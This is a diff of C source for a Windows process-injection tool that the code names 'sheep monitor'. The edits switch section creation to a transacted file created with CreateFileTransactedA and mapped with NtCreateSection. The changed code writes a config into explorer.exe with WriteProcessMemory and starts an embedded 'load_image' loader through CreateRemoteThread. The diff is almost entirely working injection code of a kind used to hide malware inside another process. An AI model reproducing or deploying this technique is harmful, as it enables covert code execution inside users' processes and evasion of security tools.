@@ -72,7 +72,7 @@ uintptr_t create_sheep_section(HANDLE target_proc, PHANDLE section_handle) {
    assert(WriteFile(sheep_monitor_file, &SHEEP_MONITOR[0], SHEEP_MONITOR_SIZE, &bytes_written, NULL));
    CloseHandle(sheep_monitor_file);
 
-   /* read the transacted file into a section
+   /* read the transacted file into a section */
    sheep_monitor_file = CreateFileTransactedA(dummy_name,
                                               GENERIC_READ,
                                               0,
@@ -84,7 +84,8 @@ uintptr_t create_sheep_section(HANDLE target_proc, PHANDLE section_handle) {
                                               NULL,
                                               NULL);
    assert(sheep_monitor_file != INVALID_HANDLE_VALUE);
-   */
+
+   /*
    sheep_monitor_file = CreateFileA("C:\\Windows\\System32\\ntdll.dll",
                                     GENERIC_READ,
                                     FILE_SHARE_READ,
@@ -92,7 +93,8 @@ uintptr_t create_sheep_section(HANDLE target_proc, PHANDLE section_handle) {
                                     OPEN_EXISTING,
                                     FILE_ATTRIBUTE_NORMAL,
                                     NULL);
-
+   */
+   
    HANDLE sheep_section;
    assert(NtCreateSection(&sheep_section,
                           SECTION_QUERY | SECTION_MAP_READ | SECTION_MAP_EXECUTE,
@@ -145,6 +147,9 @@ DWORD get_export_rva(uint8_t *image_base, const char *export_name) {
 }
  
 int main(int argc, char *argv[]) {
+   DWORD loader_rva = get_export_rva(&SHEEP_MONITOR[0], "load_image");
+   assert(loader_rva != 0);
+
    DWORD proc_array_bytes = sizeof(DWORD) * 1024;
    DWORD *proc_array = (DWORD *)malloc(proc_array_bytes);
    DWORD proc_array_needed;
@@ -203,9 +208,6 @@ int main(int argc, char *argv[]) {
    SIZE_T bytes_written;
    assert(config_base != 0);
    assert(WriteProcessMemory(explorer_proc, (LPVOID)config_base, &config, sizeof(SheepConfig), &bytes_written));
-
-   DWORD loader_rva = get_export_rva(&SHEEP_MONITOR[0], "load_image");
-   assert(loader_rva != 0);
 
    DWORD loader_id;
    HANDLE remote_thread_handle = CreateRemoteThread(explorer_proc,
